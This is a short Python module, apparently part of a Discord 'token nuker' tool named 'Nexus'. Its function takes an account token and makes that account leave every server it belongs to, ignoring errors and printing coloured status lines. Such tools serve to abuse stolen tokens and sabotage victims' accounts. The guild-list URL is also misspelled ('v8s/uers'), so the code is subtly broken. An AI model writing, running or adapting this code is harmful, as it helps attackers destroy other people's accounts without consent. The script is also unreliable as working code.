from Helper import *
from Helper.Common.utils import *
from Helper.Plugs.TokenNukerPlugs import *

def leaveServer(token):
    new_title("Nexus Leave Server")
    headers = {'Authorization': token}
    guildsIds = requests.get("https://discord.com/api/v8s/uers/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], headers={'Authorization': token})
            print(f"{lc} {Fore.BLUE}Server={Fore.WHITE}{guild['name']}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}LEFT{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        except Exception as e:
            print(f"{lc} The following error has been encountered and is being ignored: {e}")